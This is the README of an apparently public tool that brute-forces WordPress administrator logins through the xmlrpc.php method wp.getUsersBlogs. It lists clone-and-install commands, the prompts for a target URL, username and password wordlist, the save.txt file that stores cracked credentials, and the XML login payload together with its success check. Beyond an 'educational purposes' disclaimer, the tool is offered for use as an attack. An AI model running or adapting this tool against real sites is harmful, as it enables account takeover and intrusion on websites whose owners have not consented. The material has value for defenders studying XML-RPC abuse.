## overview
this tool performs a **brute force attack** against WordPress sites via the vulnerable XML-RPC API method `wp.getUsersBlogs`.

If `xmlrpc.php` is enabled and not protected, it allows attackers to send repeated login attempts in a structured XML format — sometimes even batching them together — bypassing traditional brute force protections.

---

## disclaimer
this script is for **educational purposes only**.  
do not use it against systems you don’t own or without **explicit permission**.  
unauthorized use may be **illegal** and could cause **criminal charges**.

---

## installation

clone repo and install dependencies:
```bash
git clone https://github.com/Pwdnx1337/xmlrpc-bruteforcer
cd xmlrpc-bruteforcer
pip install -r requirements.txt
````
## usage

run the script:

```bash
python3 xmlrpc.py
```

it will prompt:

```
url: https://example.com/xmlrpc.php
username: admin
password: wordlist.txt
```

* **url** > target site XML-RPC endpoint
* **username** > WordPress username to attack
* **password** > path to your password list file

successful credentials are saved in:

```
save.txt
```

example entry:

```
https://example.com/xmlrpc.php admin:password123
```

---

## technical Explanation

* WordPress includes `xmlrpc.php`, an API endpoint used for remote publishing, pingbacks, and integrations.
* inside `xmlrpc.php`, the method `wp.getUsersBlogs` can authenticate a user with **username + password**.
* if brute-force protections are not applied:

  * an attacker can automate thousands of login attempts via XML-RPC.
  * unlike `wp-login.php`, XML-RPC may not trigger login rate-limiting.
  * some servers allow **multicall requests** (dozens of login attempts in a single HTTP request).

### attack flow

1. script prepares an XML payload with:

   ```xml
   <methodName>wp.getUsersBlogs</methodName>
   <params>
     <param><value><string>{username}</string></value></param>
     <param><value><string>{password}</string></value></param>
   </params>
   ```
2. sends payload via `POST` to `xmlrpc.php`.
3. if credentials are correct > the response contains `<name>` and `isAdmin`.
4. once found, credentials are logged to `save.txt`.
